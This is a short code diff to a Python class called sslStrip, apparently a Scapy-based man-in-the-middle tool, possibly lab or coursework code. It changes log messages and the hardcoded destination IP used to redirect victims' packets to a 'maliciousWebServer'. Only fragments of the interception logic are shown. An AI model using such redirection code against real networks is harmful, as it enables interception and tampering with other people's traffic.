@@ -126,8 +126,8 @@ class sslStrip():
 
     def packetForwarding(self, packet):
         if packet.haslayer(Ether) and packet.haslayer(IP):#check IP&Arp Layer
-            self.show.insert(END, "from ip: {},mac from: {} to ip: {}, ip gateway{}, mac gateway{}".format(packet[IP].dst, packet[Ether].dst, packet[IP].src, self.maliciousWebServer[0]["ip"],self.maliciousWebServer[0]["mac"]) + '\n')
-            self.show.insert(END, "to ip: {}, ip gateway{}, mac gateway{}".format(packet[IP].src, self.maliciousWebServer[0]["ip"],self.maliciousWebServer[0]["mac"]) + '\n')
+            self.show.insert(END, "from ip: {} mac{}, to ip: {} ".format( packet[IP].src, packet[Ether].src, packet[IP].dst) + '\n')
+            self.show.insert(END, "ip gateway{}".format( self.maliciousWebServer[0]["ip"],) + '\n')
             self.show.insert(END,'\n')                                                                    
             self.show.see(END)
             self.show.update_idletasks()
@@ -138,7 +138,7 @@ class sslStrip():
             for vict in self.target:
                 if (vict["mac"] == packet[Ether].src):
                     sender, senderfound = self.SndFound(vict)
-                    if ('192.168.0.1' == packet[IP].dst):
+                    if ('131.155.3.3' == packet[IP].dst):
                         receiver, receiverfound = self.rcvFound(self.maliciousWebServer[0])
                         self.show.insert(END, "Redirect from ip: {}, mac: {}".format(packet[IP].dst, packet[Ether].dst) + '\n')
                         self.show.insert(END,'\n')                                                                    
